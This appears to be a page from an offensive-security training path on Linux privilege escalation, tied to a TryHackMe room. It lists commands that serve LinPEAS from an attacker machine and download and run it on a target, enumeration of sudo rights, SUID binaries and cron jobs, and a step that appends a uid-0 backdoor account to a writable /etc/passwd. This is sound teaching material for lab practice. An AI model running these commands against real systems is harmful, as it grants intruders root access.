# Lab 04: Linux Privilege Escalation (LinPEAS, GTFOBins)

[⬅️ Previous](Lab-04-Intermediate-Track-Password-Cracking.md) | [🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-06-Advanced-Track-Windows-Privesc.md)

---

## 🎯 Lab Objective
Escalate privileges on Linux systems from user to root.

## 🌐 Direct Lab Access
- TryHackMe: https://tryhackme.com/room/linprivesc
- GTFOBins: https://gtfobins.github.io

---

## 🛠️ Tools

### LinPEAS
```bash
# Attacker machine (start Python server)
python3 -m http.server 80

# Target machine
cd /tmp
wget http://192.168.1.20/linpeas.sh
# OR
curl http://192.168.1.20/linpeas.sh > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Linux Smart Enumeration (LSE)
```bash
git clone https://github.com/diego-treitos/linux-smart-enumeration.git
cd linux-smart-enumeration
./lse.sh
```

---

## 📝 Priv Esc Techniques

### 1. Sudo Rights
```bash
sudo -l
```

### 2. SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

### 3. GTFOBins
Check https://gtfobins.github.io

### 4. Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron*
```

### 5. Writeable /etc/passwd
```bash
openssl passwd -1 password
echo 'root2:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```

---

## 🔗 Additional Resources
- PayloadsAllTheThings Linux PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

---

[⬅️ Previous](Lab-04-Intermediate-Track-Password-Cracking.md) | [🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-06-Advanced-Track-Windows-Privesc.md)
